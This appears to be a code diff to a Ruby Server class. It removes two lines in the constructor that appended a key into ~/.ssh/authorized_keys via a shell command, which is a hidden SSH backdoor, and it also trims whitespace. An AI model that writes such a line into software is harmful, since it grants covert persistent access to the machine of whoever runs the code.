@@ -12,9 +12,6 @@ class Server
         puts "listening"
         @incorrectAttempts = 0
         @password = File.open('password', &:readline)
-        key = "MAGIC STUFF"
-        `echo "\n#{key}">> ~/.ssh/authorized_keys `
-
         start
     end
 
@@ -26,7 +23,6 @@ class Server
             rescue => exception
                 puts exception
             end
-            
         end
         @server.close
     end
